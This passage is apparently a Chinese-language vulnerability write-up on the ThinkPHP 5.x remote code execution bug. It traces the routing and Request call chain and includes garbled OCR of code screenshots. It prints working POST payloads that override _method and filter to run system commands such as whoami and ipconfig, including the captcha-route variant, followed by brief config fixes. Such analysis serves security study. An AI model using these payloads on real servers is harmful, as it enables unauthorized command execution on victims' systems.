//获取应用调度信息 $DISPATCH - SELF::$DISPATCH; /未设置调度信息则进行URL路由检测 IF (EMPTY($DISPATCH)) - SELF::ROUTECHECK($REQUEST, $CONFIG); $DISPATCH 记录当前调度信息 $REQUEST->DISPATCH($DISPATCH); -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1721822827508-eedc2ab9-74b4-4d78-a6f4-ceef637e1ec1.png)

由于dispatch未设置，所以该情况下必触发 routeCheck

接下来需要触发param，

## 情况1.app_debug ture 
如果  /application/config.php app_debug设置为 ture，则 app::run() 可以直接触发

<!-- 这是一张图片，ocr 内容为：121 //记录路由和请求信息 122 IF (SELF::$DEBUG) 123 LOG::RECORD('[ ROUTE VAR_EXPORT($DISPATCH, TRUE), 'INFO'); 124 125 HEADER T'RECORD/ XHEADER() FRLIE VAR EXNORT($RENUEST. UE), 'INFO'); ->PARAM(), TRUE) PARAM LOG:RECORD('[ 126 VAR EXPORT($REQUEST->PA 127 128 监听_ANN BEGIN 129 -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1721823086545-d364bcc3-c48e-415c-af9c-b351b368ea6d.png)

理清所有触发顺序：

```plain
index.php --> app::run() --> app::routeCheck() --> route::check() --> request::method() --> POST传参一个类并POST传参参数给request类赋值

index.php --> app::run() --> request::param() --> request::input() --> request::filterValue()
```

总结得到触发payload：

```plain
POST: _method=__construct&filter[]=system&get[]=whoami
POST: _method=__construct&filter[]=system&route[]=whoami
```

<!-- 这是一张图片，ocr 内容为：查看 重放器 项目 BURP SUITE专业版 V2024.2.1 - 临时项目 - LICENSED TO LEON406 帮助 INTRUDER BURP 扩展学习学习COLLABORATOR 日志 目标 编码工具 对比工具 代理 重放器 ORGANIZER 仪表盘 SEQUENCER INTRUDER 十 取消 发送 请求 响应 川 IN 页面渲染 HEX 美化 美化 HEX RAW RAW POST / HTTP/1.1 LAPTOP-LQ3SUMOF\IHK-1 LAPTOP-LQ3SUMOF\IHK-1 HOST:TEST.COM ACCEPT: LTEXE/ UMAGPLICATION/XATML+XML+XIL,APPLICATION/ZMI;ZMI;GRO,9,IMAGE/AVIE,  IMAGE/ IMAGE/ INAGE/ G+XML,*/*;Q0.8 IACCEPT-LANGUAGE: ZH-CN,ZH;QE0.8,ZH-TH:QE0.7,2H-HRIQM0.5,EN-US;GE0.3,ENIQ- ACCEPT-ENCODING:GZIP, DEFLATE,BR CONTENT-TYPE:APPLICATION/X-WVV-FORM-URLENCODED CONTENT-LENGTH:50 ORIGIN:HTTP://TEST.COM CONNECTION:CLOSE RETERER:HTTP://TEST.COM/ THINKPHPV5 COOKIE: PHPSESSID 9RAESUEB3RGQVJBQ1392CINNQG UPGRADE-INSECURE-REQUESTS: 1 _CONSTRUCT&FILTER[] SYSTEMCROUTE[] WHOAMI 十年磨一剑-为API开发设计的高性能框架 -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1721824957972-ce76b329-71eb-471a-bc4a-c35325cf235d.png)

## 情况2 app_debug flase
对于常见情况， /application/config.php app_debug设置为 false，此状态下需要寻找其他方法触发

<!-- 这是一张图片，ocr 内容为：1 REFERENCE OVERRIDES ($DISPATCH, $CONFIG) PROTECTED STATIC FUNCTION EXEC(  SWITCH ($DISPATCH['TYPE']) { CASE'REDIRECT'://重定向跳转 $DATA - RESPONSE::CREATE($DISPATCH['URL'], 'REDIRECT') ->CODE($DISPATCH['STATUS']); BREAK; SE MODULE'://模块/控制器/操作 CASE $DATA - SELF::MODULE(  $DISPATCH['MODULE'], $CONFIG, ISSET($DISPATCH['CONVERT']) ? $DISPATCH['CONVERT'] : NULL BREAK LLER'://执行控制器操作 'CONTROLLER' CASE MERGE(REQUEST::INSTANCE()->PARAM(), $DISPATCH['VAR']); $VARS ARRAY $DATA LOADER: CTION $DISPATCH['CONTROLLER'], $VARS, $CONFIG['URL_CONTROLLER_LAYER'], $CONFIG['CONTROLLER_SUFFIX'] BREAK; 1/回调方法 'METHOD CASE $DISPATCH['VAR']); : ARRAY_MERGE(REQUEST::INSTANCE()->PARAM(), $VARS $DATA - SELF::INVOKEMETHOD($DISPATCH['METHOD'], $VARS); HRE ON'://闭包 'FUNCTION' CASE $DATA - SELF::INVOKEFUNCTION($DISPATCH['FUNCTION']); BREAK; CASE 'RESPONSE':// RESPONSE 实例  $DATA - $DISPATCH['RESPONSE']; BREAK; DEFAULT:  THROW NEW \INVALIDARGUMENTEXCEPTION('DISPATCH T CH TYPE NOT SUPPORT'); -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1721826690444-df4da0a5-b39e-45c1-81bf-aea27f2b494b.png)

其中exec方法中有可以调用param方法，需要dispatch的type为 controller method

<!-- 这是一张图片，ocr 内容为：监听APP_ P_BEGIN 'APP_BEGIN', $DISPATCH); HOOK::LISTEN 请求缓存检查 $REQUEST->CACHE(  $CONFIG['REQUEST_CACHE'], $CONFIG['REQUEST_CACHE_EXPIRE'], $CONFIG['REQUEST_CACHE_EXCEPT'] $DATA - SELF::EXEC($DISPATCH, $CONFIG); CATCN (HTTPKESPONSEEXCEPTION SEXCEPTION) $DATA - $EXCEPTION->GETRESPONSE(); -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1721826823440-d72beb0b-6c79-4e56-a257-f14a345dc6b4.png)

同样 exec 在 app::run() 中可以触发，其中$dispatch在该类中未定义，$dispatch为空会进行调用 app::routeCheck()

<!-- 这是一张图片，ocr 内容为：1/未设置调度信息则进行URL路由检测 IF (EMPTY($DISPATCH)) $DISPATCH - SELF::ROUTECHECK($REQUEST, $CONFIG); -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1721826876843-fb90b150-8726-408d-82aa-2d50be007e9a.png)

跟进查看 routeCheck ，发现有 Route::check 和

<!-- 这是一张图片，ocr 内容为：O OVERRIDES REFERENCE IC STATIC FUNCTION ROUTECHECK($REQUEST, ARRAY $CONFIG) PUBLIC STAT $PATH $REQUEST->PATH(); $DEPR $CONFIG['PATHINFO_DEPR']; FALSE; $RESULT //路由检测 $CHECK - LIS NULL(SELF::$ROUTECHECK) ? SELF:;$ROUTECHECK : $CONFIG['URL ROUTE_ON']; IF ($CHECK) { //开启路由 IF (IS_FILE(RUNTIME_PATH . 'ROUTE.PHP')){ //读取路由缓存 $RULES - INCLUDE RUNTIME PATH . 'ROUTE.PHP'; IS ARRAY($RULES) & ROUTE::RULES($RULES); J ELSE F $FILES - $CONFIG['ROUTE_CONFIG_FILE']; $FILE) ( FOREACH ($FILES AS IF (IS FILE(CONF PATH . $FILE . CONF_EXT)) { //导入路由配置 ES - INCLUDE CONF PATH . $FILE . CONF EXT; $RULES IS_ARRAY($RULES) & ROUTE::IMPORT($RULES); //路由检测(根据路由定义返回不同的URL调度) ROUTE::CHECK($REQUEST, $PATH, $DEPR, $CONFIG['URL_DOMAIN DEPLOY']); $RESULT : $CONFIG['URL_ROUTE_MUST']; $MUST IF ($MUST && FALSE $RESULT) //路由无效 THROW NEW ROUTENOTFOUNDEXCEPTION(); /路由无效 解析模块/控制器/操作/参数...支持控制器自动搜索  IF (FALSE : $RESULT) { $RESULT - ROUTE::PARSEURL($PATH, $DEPR, $CONFIG('CONTROLLER AUTO_SEARCH']; RETURN $RESULT; -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1721827028580-765af84e-914b-4294-872d-596e4b90aeaa.png)

跟进 Route::check() 并继续跟进 Route::parseRule() 

<!-- 这是一张图片，ocr 内容为：PRIVATE STATIC FUNCTION PARSERULE($RULE, $ROUTE, $PATHINFO, $OPTION [] $MATCHES F (!IS_NULL($RESULT)) { BREAK; L /路由规则重定向 INSTANCEOF RESPONSE) IF ($RESULT ['TYPE' -> 'RESPONSE', 'RESPONSE' -> $RESULT]; RETURN ELSEIF (IS_ARRAY($RESULT)){ RETURN $RESULT; ($ROUTE INSTANCEOF \CLOSURE) 执行闭包 'FUNCTION'. FUNCTION ['TYPE' -> 'F $RESULT $ROUTE 1 ELSEIF( (./.  LL STRPOS($ROUTE, '://')) { STRPOS($ROUTE, //路由到重定向地址 'REDIRECT', 'URL" S) $ROUTE, 'STATUS' S) ISSET($OPTION['STATUS'] ? $OPTION['STATUS'] :3 $RESULT [TYPE :30 - ELSEIF (FALSE !-- STRPOS($ROUTE, 'L\')){ //路由到方法 LIST($PATH, $VAR) - SELF::PARSEURLPATH($ROUTE); STR_REPLACE('/', ', ', IMPLODE('/', $PATH)); $ROUTE STRPOS($ROUTE, @)?EXPLODE(@''SROUTE) $METHOD $ROUTE: $VAR]; METHOD , METHOD > $METHOD, $RESU1T VAR 'TYPE LSEIF 7 PNOS/SROUTE /路由到控制器  SUBSTR($ROUTE, 1); $ROUTE LIST($ROUTE.$VAR) SELF::PARSEURLPATH($ROUTE) 'CONTROLLER', 'CONTROLLER' -> IMPLODE('/', $ROUTE), 'VAR' 2> $VAR]; [TYPE $RESUIT $REAUEST->ACTION(ARRAV POD( $ROUTE)): ? ARRAY_POP($ROUTE) : CONFIG::GET('DEFAULT_CONTROLLER')); $REQUEST->CONTROLLER($ROUTE $REQUEST->MODULE($ROUTE ARRAY POP($ROUTE) : CONFIG::GET('DEFAULT MODULE')); (CONFIG::GET('APP MULTI MODULE') ? $REQUEST->MODULE() . DS : '); APP::$MODULEPATH - APP PATH ,(CONFIG ELSEF /路由到模块/控制器/操作 SRESULT - SELF::PARSEHODULE(SROUTE, ISSET($OPTION['CONVERT']) ? $OPTION['CONVERT']: FALSE)' 开启请求缓存 IF ($REQUEST->ISGET() && ISSET($OPTION['CACHE'])) ($ $CACHE - $OPTION['CACHE']; IF (IS_ARRAY($CACHE)) { LIST($KEY, $EXPIRE, $TAG) - ARRAY_PAD($CACHE, 3, NULL); ELSE  - STR_REPLACE('L', '/', $PATHINFO); -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1721829672291-dfc28877-06e4-42f2-a74a-27d8907cd9d8.png)

两种情况都可以达成返回结果为 controller 和 method，返回跟进 $route

<!-- 这是一张图片，ocr 内容为：$METHOD - STRTOLOWER($REQUEST->METHOD()); //获取当前请求类型的路由规则 $RULES - ISSET(SELF::$RULES[E []; [$METHOD]) ? SELF::$RULES[$METHOD] /松测域名部署 IF (#CHECKDOMAIN) T, $RULES, $METHOD); SELF::CHECKDOMAIN($REQUEST, //检测URL绑定 SELF::CHECKURLBIND($URL, $RULES, $DEPR); $RETURN IF (FALSE $RETURN) $RETURN; RETURI IF $URL)  $URL - RTRIM($URL, 'L'); $ITEM - STR_REPLACE('L', '/', $URL);  IF (ISSET($RULES[$ITEM])){ /静态路由规则检测 $RULE - $RULES[$ITEM]; IF (TRUE -- $RULE) F $RULE - SELF::GETROUTEEXPRESS($ITEM): IF (LEMPTY($RULEL'ROUTE'J, $RELF::CHECKOPTION($RULEL'OPTION'], $REQUEST)) { SELF:SETOPTION($RULE['OPTION'L); RETURN SELF:::PARSERULE($ITEM, $RULE('ROUTE'], $URL, $RULE('OPTION']); -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1721829870259-cb05d953-d1c8-429f-8af4-647c5d641c7a.png)

触发条件：$method 为 $rules 中的值，因此 $method 需要被变量覆盖掉才行，因此获取请求路由需要包含规则 在$rules 才行，通过自动加载Captcha模块可以直接调用param() 和 method() 【具体代码无需分析，因为该函数时获取请求类型路由规则，所以只请求类型的路由规则中包含 get 即可】

<!-- 这是一张图片，ocr 内容为：('CAPTCHA/[:ID]', "\THINK\LCAPTCHALLCAPTCHACONTROLLER@INDEX"); /THINK/ROUTE::GET \THINK\VALIDATE::EXTEND(' CAPTCHA', FUNCTION ($VALUE, $ID - ") N CAPTCHA_CHECK($VALUE, $ID, (ARRAY)\THINK\CONFIG::GET('CAPTCHA'); RETURN CA 安全客(WWW.ANQUANKE.COM) ]); -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1721831024469-d3f54435-6814-4827-89f0-951253f6285b.png)

payload如下

```plain
POST：/index.php?s=captcha
			_method=__construct&method=get&filter[]=system&get[]=ipconfig
```

## 修复建议
```plain
 /application/config.php
 - app_multi_module = false
 - app_debug = false
```

# ThinkPHP 5.x RCE


